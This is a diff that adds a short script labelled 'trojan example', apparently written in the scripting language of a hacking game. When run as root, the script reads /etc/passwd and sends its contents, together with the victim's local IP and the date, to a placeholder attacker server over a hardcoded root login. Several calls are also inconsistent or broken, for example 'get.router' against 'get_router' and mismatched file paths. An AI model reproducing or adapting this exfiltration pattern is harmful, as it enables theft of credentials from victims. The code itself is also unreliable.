@@ -1,0 +1,19 @@
+// trojan example
+
+if active_user != "root" then exit("")
+
+server = get_shell.content_service("IP-SERVIDOR",22,root,"CONTRASEÑA")
+if not server then exit("<color=red>Error")
+
+passwdfile = get_shell.host_computer.File("/etc/passwd")
+
+if passwdfile then
+	passwords = passwdfile.content
+else
+	passwords = "File not found!"
+end if
+
+server.host_computer.touch("/root/info",get.router.public_ip)
+infofile = server.host_computer.File("/root/info"+get_router.public_ip)
+
+infofile.set_content(get_router.local_ip + "\n" + current_date + "\n" + passwords)
